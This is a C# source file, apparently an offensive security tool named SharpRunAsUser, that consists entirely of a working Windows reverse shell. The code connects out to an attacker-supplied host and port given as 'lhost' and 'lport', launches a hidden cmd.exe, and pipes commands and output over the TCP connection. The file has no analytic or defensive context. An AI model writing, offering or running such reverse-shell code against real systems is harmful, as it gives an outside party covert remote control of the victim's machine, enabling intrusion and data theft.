using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;


namespace SharpRunAsUser
{
    internal class Program
    {
        static StreamWriter streamWriter;
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.Write(strOutput);
                    streamWriter.WriteLine();
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        static void Main(string[] args)
        {
            Dictionary<string,string> arguments = CommandLineArguments.ArgParse(args);

           

             RunRevShell(arguments["lhost"], int.Parse(arguments["lport"]));

        }

        public static void RunRevShell(string ip, int port)
        {
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();
                        

                        Process p = new Process();
                        p.StartInfo.FileName = @"cmd.exe";
                        //p.StartInfo.WorkingDirectory = @"C:\Windows\System32";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
    }
}
